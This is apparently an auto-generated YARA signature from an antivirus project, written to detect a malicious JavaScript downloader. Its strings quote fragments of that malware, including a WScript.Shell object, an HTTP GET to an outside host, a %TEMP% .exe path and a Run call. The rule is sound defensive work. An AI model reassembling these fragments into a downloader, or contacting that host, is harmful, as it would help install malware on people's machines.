rule sig_20160330_d5490c3abe6650c84eba6b6c488fdbda {
  meta:
    description = "datamaliciousorder - file 20160330_d5490c3abe6650c84eba6b6c488fdbda.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8744d60c2612b02ded766c5b3c988f7d9c44eaf246a1e4ac3d9c77f49154c506"

  strings:
    $s1  = "var E0 = function K() {return WScript[W0](\"WScript\"+\".Shell\");}(), D = 11;" fullword ascii
    $s2  = "SM[F](\"GET\", \"http://vidamparty.hu/as0ldr\", false);" fullword ascii
    $s3  = "function Z(GK, IA0){E = E * 1; return GK - IA0;};" fullword ascii
    $s4  = "if (SM[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function XV() {return E0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"MRWWQ81h.ex\" + \"e\";};" fullword ascii
    $s6  = "function PJ(){return HV + \"\";};" fullword ascii
    $s7  = "function MZ() {return ((H0 == true) && (H0 == QM)) ? 1 : E;};" fullword ascii
    $s8  = "function CC(M){E0[\"Run\"](M, E, E);};" fullword ascii
    $s9  = "var XI = new this[\"Date\"]();" fullword ascii
    $s10 = "function UF(){return 22;};" fullword ascii
    $s11 = "}while (EX);" fullword ascii
    $s12 = "function GR(){return W0;};" fullword ascii
    $s13 = "function EM()" fullword ascii
    $s14 = "return Z(T, U);" fullword ascii
    $s15 = "function DO(W) {var LF = (1, 2, 3, 4, 5, W); return LF;};" fullword ascii
    $s16 = "var C = false;" fullword ascii
    $s17 = "var H0 = false;" fullword ascii
    $s18 = "var QM = false;" fullword ascii
    $s19 = "H0 = true; " fullword ascii
    $s20 = "QM = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}